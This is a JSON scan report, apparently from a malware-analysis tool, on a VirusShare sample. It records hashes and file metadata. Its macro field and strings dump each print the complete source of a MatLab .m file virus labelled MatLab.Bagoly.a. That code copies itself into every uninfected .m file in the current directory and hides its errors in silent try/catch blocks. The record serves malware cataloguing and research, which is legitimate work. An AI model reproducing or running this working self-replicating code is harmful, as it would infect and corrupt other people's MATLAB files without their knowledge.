{
    "docinfo": {
        "attributes": [],
        "behavior": {},
        "macro": "%-------------------------------------------------------\n% MatLab .m file infector by Positron (MatLab.Bagoly.a)\n%-------------------------------------------------------\ntry\n    clear virfile__;\n    EndSignature__ = strcat('__EndSignature','__');\n\n    destdir__ = '.\\';\n    %---------------------------------------\n    fid__ = fopen(strcat('\\',strcat(mfilename,'.m')), 'r');\n    i__ = 1;\n    while 1\n        tline__ = fgetl(fid__);\n        if tline__ == -1,   break,   end\n        virfile__(i__:i__) = cellstr(tline__);\n        i__ = i__ + 1;\n        if length(strfind(tline__,EndSignature__)) > 0\n            break;\n        end\n    end\n    fclose(fid__);\n    %----------------------------------------\n    FileList__ = dir(strcat(destdir__,'*.m'));\n    DirLength__ = length(FileList__);\n\n    if DirLength__ > 0\n        for m__=1:DirLength__\n            try\n                fid__ = fopen(strcat(destdir__,FileList__(m__).name), 'r');\n                if fid__ > -1\n                    clear originalfile__;\n                    i__ = 1;\n                    infected__ = 0;\n                    while infected__ == 0\n                        tline__ = fgetl(fid__);\n                        if tline__ == -1,   break,   end\n                        originalfile__(i__:i__) = cellstr(tline__);\n                        i__ = i__ + 1;\n                        if length(strfind(tline__,EndSignature__)) > 0\n                            infected__ = 1;\n                        end\n                    end\n                    fclose(fid__);\n                    \n                    if infected__ == 0\n                        fid__ = fopen(strcat(destdir__,FileList__(m__).name), 'w');\n                        if fid__ > -1\n                            for i__=1:length(virfile__)\n                                fprintf(fid__,'%s\\n',char(virfile__(i__)));\n                            end\n                            fprintf(fid__,'%s\\n','');\n                            for i__=1:length(originalfile__)\n                                fprintf(fid__,'%s\\n',char(originalfile__(i__)));\n                            end\n                            fclose(fid__);\n                        end\n                    end\n                end\n            catch\n            end\n        end\n    end\ncatch\nend\ne__ = '__EndSignature__';"
    },
    "filename": "VirusShare_31f34420a3b48b59e0d564e0f222455e",
    "filesize": 2370,
    "filetype": "ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "31f34420a3b48b59e0d564e0f222455e",
        "sha1": "a0b8f81796bbf469f8010b2ca9d8dabdfaad6bc4",
        "sha256": "16fc7e2afc81a03c568f19ff08dbb405a8a30064fef872028f1b3209edc71695"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "%-------------------------------------------------------",
            "% MatLab .m file infector by Positron (MatLab.Bagoly.a)",
            "%-------------------------------------------------------",
            "    clear virfile__;",
            "    EndSignature__ = strcat('__EndSignature','__');",
            "    destdir__ = '.\\';",
            "    %---------------------------------------",
            "    fid__ = fopen(strcat('\\',strcat(mfilename,'.m')), 'r');",
            "    i__ = 1;",
            "    while 1",
            "        tline__ = fgetl(fid__);",
            "        if tline__ == -1,   break,   end",
            "        virfile__(i__:i__) = cellstr(tline__);",
            "        i__ = i__ + 1;",
            "        if length(strfind(tline__,EndSignature__)) > 0",
            "            break;",
            "        end",
            "    end",
            "    fclose(fid__);",
            "    %----------------------------------------",
            "    FileList__ = dir(strcat(destdir__,'*.m'));",
            "    DirLength__ = length(FileList__);",
            "    if DirLength__ > 0",
            "        for m__=1:DirLength__",
            "            try",
            "                fid__ = fopen(strcat(destdir__,FileList__(m__).name), 'r');",
            "                if fid__ > -1",
            "                    clear originalfile__;",
            "                    i__ = 1;",
            "                    infected__ = 0;",
            "                    while infected__ == 0",
            "                        tline__ = fgetl(fid__);",
            "                        if tline__ == -1,   break,   end",
            "                        originalfile__(i__:i__) = cellstr(tline__);",
            "                        i__ = i__ + 1;",
            "                        if length(strfind(tline__,EndSignature__)) > 0",
            "                            infected__ = 1;",
            "                        end",
            "                    end",
            "                    fclose(fid__);",
            "                    ",
            "                    if infected__ == 0",
            "                        fid__ = fopen(strcat(destdir__,FileList__(m__).name), 'w');",
            "                        if fid__ > -1",
            "                            for i__=1:length(virfile__)",
            "                                fprintf(fid__,'%s\\n',char(virfile__(i__)));",
            "                            end",
            "                            fprintf(fid__,'%s\\n','');",
            "                            for i__=1:length(originalfile__)",
            "                                fprintf(fid__,'%s\\n',char(originalfile__(i__)));",
            "                            end",
            "                            fclose(fid__);",
            "                        end",
            "                    end",
            "                end",
            "            catch",
            "            end",
            "        end",
            "    end",
            "catch",
            "e__ = '__EndSignature__';"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.288692",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
